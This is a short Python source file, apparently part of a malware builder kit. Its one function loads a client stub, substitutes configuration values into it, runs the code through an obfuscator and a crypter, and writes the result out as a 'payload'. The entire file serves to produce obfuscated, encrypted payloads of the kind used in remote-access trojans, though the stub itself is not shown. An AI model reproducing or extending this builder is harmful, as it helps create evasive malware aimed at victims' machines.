import json, os, random, string
from builder.obfuscator import obfuscate_code
from builder.crypter import encrypt_payload
from utils.config_template import config_template

def generate_payload(config, output_path):
    with open('client/stub.py', 'r') as stub_file:
        payload_code = stub_file.read()

    for key, value in config.items():
        payload_code = payload_code.replace(f'{{{{{key}}}}}', str(value))

    obfuscated_code = obfuscate_code(payload_code)
    encrypted_code = encrypt_payload(obfuscated_code)

    with open(output_path, 'w') as out_file:
        out_file.write(encrypted_code)

    print(f"[+] Payload written to {output_path}")
